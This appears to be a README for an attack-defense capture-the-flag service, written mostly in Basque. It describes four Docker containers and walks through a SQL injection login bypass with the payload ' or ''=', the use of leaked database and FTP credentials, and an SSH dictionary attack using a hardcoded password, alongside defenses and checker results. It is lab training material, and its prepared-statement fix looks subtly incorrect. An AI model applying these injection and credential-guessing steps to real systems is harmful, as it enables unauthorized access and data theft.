# Service definition:
- 4 docker dauzkagu: 
1. Ubuntu:latest  ssh zerbitzuarekin eta flagak dituena.
2. fauria/vsftpd:latest ftp zerbitzuarekin eta flagak dituena ere. 
3. mariadb:latest mariadb datu base bat duena eta flagak dituena ere.
4. php:7.4-apache web zerbitzari bat duena.

Erasotzaileak web zerbitzaria sarrerea dauka eta bertan informazioa nola lortu bilatu behar du.
Flagak beste 3 dockerretan gordetzen dira. Flag guztiak mariadb, ftp eta ssh dockerretan gordetzen dira.

# Service implementation:
web dockerra src karpetan dauden index.html, login.php eta db.php fitxategien kopia ditu dockerraren /var/www/html/ karpetan.
  - Erasotzaileek db.php fitxategia aldatzeko aukera dute.

mariadb dockerran db izeneko datubase bat sortzen da:
  - usuarios taulan zenbait erabiltzaile eta pasahitz daude. (ftp dockerrarenak barne)
  - flags taulan txanda bakoitzeko flagak gordeko dira.

ftp dockerran usernames.txt eta passlist.txt izeneko bi fitxategi daude eta /home/vsftpd/ftpuser/ karpetan daude kokatuta.
  - Fitxategi hauen edukiak ezin dira aldatu.
  - Flagak flags.txt izeneko fitxategi batena gordeko dira aurreko fitxategin karpeta berean.

ssh docker is configured attending to the following tips:
  - It has openssh-server installed and started. 
  - It has a user called 'shaktale' whose password is 'fortrash'. 
  -'shaktale' user's password will never be changed. Moreover, if a team changes it, it will be losing SLa points. 
  -Flags: 
    Flags will be stored in '/tmp/flags.txt' file. 



# About exploting:
- Erasotzaileak SQL Injection eraso bat egin behar du web orrian. Horretarako (' or ''=') textu sartu beharko ditu web orriaren formularioaren 2 kutxatan.
- Erasoa ondo ateratzen bada, jatorrizko kodean datu-basean sartzeko kredentzialak ikusgai izango ditu.
- Defendatzailea mariadb-ko erabiltzaiearen pasahitza aldatu beharko du.
  Erasoa Team2-ren kontra
    - mariadb -upNce -pht3Zklyy db "SELECT flag FROM flags ORDER BY id DESC LIMIT 5;"
    - kopiatu azken 5 flagak.
    - Konektatua 10.0.2.1 makinara ssh bitartez eta bertan /root/xx.flag fitxtegian itsatsi.
  Defentza-rako 2 gauza egin daitezke:
    1. MariaDBko erabiltzaiearen pasahitza aldatu: mariadb -upNce -pht3Zklyy db "SET PASSWORD FOR 'pNce'@'%' = PASSWORD('newpass');"
    2. db.php fitxategian sql sententziaren exekuzioa preparedStatement batekin egin SQLinjection erasoa ekiditzeko (18. eta 19. lerrotan)
      $sql = "SELECT * FROM usuarios WHERE username=? AND password=?";
      $stmt = $mysqli->prepare($sql);
      $stmt->bind_param($username, $password);
      $result = $conn->execute($stmt);


- Erasotzailea mariadb zerbitzuan usuarios izeneko taula bat ikusiko du baita. Bertan erabiltzaile eta pasahitz batzuk aurkitutko ditu, ftp zerbitzukoak barne.
  Erasoa Team1-en kontra
    - usuarios taularen edukia lortu (select * from usuarios)
    - Erabiltzaile bakoitzeko ftp konekzioa bat saiatu erabiltzaile zuzena lortu arte (ftp VgMY@10.0.1.101 - pasahitza B5yYTXF3)
    - Behin konekzioa eginda 3 fitxategi aurkituko ditu: usernames.txt, passlist.txt eta flags.txt
    - flags.txt fitxategiko azkenengo flagak kopiatu eta 10.0.1.1 makinaren /root/xx.flag fitxategian kopiatu ssh bitartez.

  Defentza
    - ftp VgMY erabiltzaiaren pasahitza aldatu.

- Azken erasoa ssh zerbitzuaren kontra egingo da usernames.txt eta passlist.txt fitxategietan dagoen edukia erabilita, hiztegi eraso bat egiten.
  Attack performed against Team1. 
  Dictionary based attack until we find shaktale:fortrash user.
  ssh -p 8822 shaktale@10.0.1.101
        Enter 'fortrash' as password
  cat /tmp/flags.txt
     Copy last flags
     Exit
  'ssh root@10.0.1.1'
  nano /root/xxx.flag
    Paste copied flags. 

  Defense performed by Team1
     'ssh root@10.0.1.101'
     docker exec -it pasapasa_ssh_1 /bin/bash
     passwd shaktale
     

# Checker checks:
- Ports to reach dockers are open (WEB:80; MARIADB:3306, FTP: 21,20, SSH 8822)
- User 'shaktale' exists in pasapasa_ssh docker. 
- User 'VgMY' exists in pasapasa_ftp docker. 
- /etc/sshd_config file from pasapasa_ssh docker has not been changed. 
- index.html and login.php file's content from pasapasa_web docker has not been changed. 
- usernames.txt and passlist.txt file's content from pasapasa_ftp docker has not been changed. 

Checks done: 
- TEAM 1. Stop the container: 'root@team0-services:~# docker stop pasapasa_web_1' It works OK, service's status becomes DOWN. 
- TEAM 1. Stop the container: 'root@team0-services:~# docker stop pasapasa_mariadb_1' It works OK, service's status becomes DOWN.
- TEAM 1. Stop the container: 'root@team0-services:~# docker stop pasapasa_ftp_1' It works OK, service's status becomes DOWN.
- TEAM 1. Stop the container: 'root@team0-services:~# docker stop pasapasa_ssh_1' It works OK, service's status becomes DOWN.
- TEAM 1. 'userdel shaktale'. It works OK, service's status becomes faulty. 
- TEAM 1. Change '/etc/sshd_config' file from 'pasapasa_ssh_1' docker. It works OK, service's status becomes faulty.
- TEAM 1. Change 'index.html' and/or 'login.php' file from 'pasapasa_web' docker. It works OK, service's status becomes faulty.
- TEAM 1. Change 'usernames.txt' and/or 'passlist.txt' file from 'pasapasa_ftp' docker. It works OK, service's status becomes faulty.
- TEAM 1. 'ssh service stop'. It works OK, service's status becomes faulty. 
- TEAM 1. 'apache2 service stop'. It works OK, service's status becomes faulty. 
- TEAM 1. 'mariadb service stop'. It works OK, service's status becomes faulty. 
- TEAM 1. 'vsftpd service stop'. It works OK, service's status becomes faulty. 



